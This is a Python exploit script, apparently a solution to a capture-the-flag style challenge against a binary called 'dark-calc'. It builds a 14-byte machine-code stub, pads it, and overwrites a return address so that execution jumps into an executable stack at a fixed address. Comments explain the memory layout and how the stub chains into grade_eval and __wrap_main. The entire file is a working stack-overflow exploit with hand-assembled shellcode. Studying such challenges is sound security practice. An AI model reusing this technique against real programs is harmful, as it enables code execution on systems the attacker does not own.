#!/usr/bin/env python3
"""Execute a 14-byte stub on dark-calc's fixed executable stack."""
import struct
import sys

# dark-calc's init_fixed_stack() maps 0x721000000000 .. +0x802000 as RWX with
# PROT_NONE guard pages at both ends, so expression[] always lands at
# 0x721000800fd0 (only 0x30 bytes before the upper guard page) and is
# executable.
#
# grade_eval() itself uses [rbp-0x4] = rbp-0x4 = buffer+0x0c, i.e. it clobbers
# the last 4 bytes of the stub while it runs, so everything the stub needs
# after grade_eval() returns must already be on the stack.  The stub therefore
# pushes its continuation address *before* calling grade_eval:
#
#   push 4; pop rdi; push __wrap_main; push grade_eval; ret
#
# grade_eval(4) prints the message, then returns into __wrap_main, which sets
# the stack back to fixed_stack_top and calls main() again; the second input()
# sees EOF, prints the answer and calls exit(0), so the process ends cleanly.
stub = bytes.fromhex("6a045f" + "680e1c4000" + "68871a4000" + "c3")
payload = stub + b"B" * (0x18 - len(stub)) + struct.pack("<Q", 0x721000800FD0)
assert len(stub) == 14 and len(payload) == 0x20
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
